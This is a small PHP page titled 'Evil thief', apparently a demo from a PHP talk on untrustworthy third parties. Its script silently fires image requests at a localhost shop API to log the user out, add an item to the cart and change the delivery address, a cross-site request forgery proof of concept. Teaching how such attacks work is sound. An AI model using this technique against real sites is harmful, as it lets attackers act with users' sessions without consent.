<?php
session_start();
?>
<html>
<head>
	<script src="../jquery-1.8.1.min.js" type="text/javascript"></script>
	<script type="text/javascript"><!--
		$(document).ready( function() {
			$('a.evil').bind('click', function(a){
				var img = new Image();
				img.src = a.currentTarget.href;
				a.originalEvent.preventDefault();
			});
		});
	// --></script>
</head>
<body>
<h1>Evil thief</h1>
Session:
<pre><?php print_r($_SESSION); ?></pre>
<ul>
	<li><a href="evil.php">refresh</a></li>
	<li><a href="http://localhost/talks/understanding_php/2-naughty-third-parties/api/logout" class="evil">logout</a></li>
	<li><a href="http://localhost/talks/understanding_php/2-naughty-third-parties/api/addToCart" class="evil">add something to the cart</a></li>
	<li><a href="http://localhost/talks/understanding_php/2-naughty-third-parties/api/setAddress?address=Thief's+Address" class="evil">set address</a></li>
</ul>

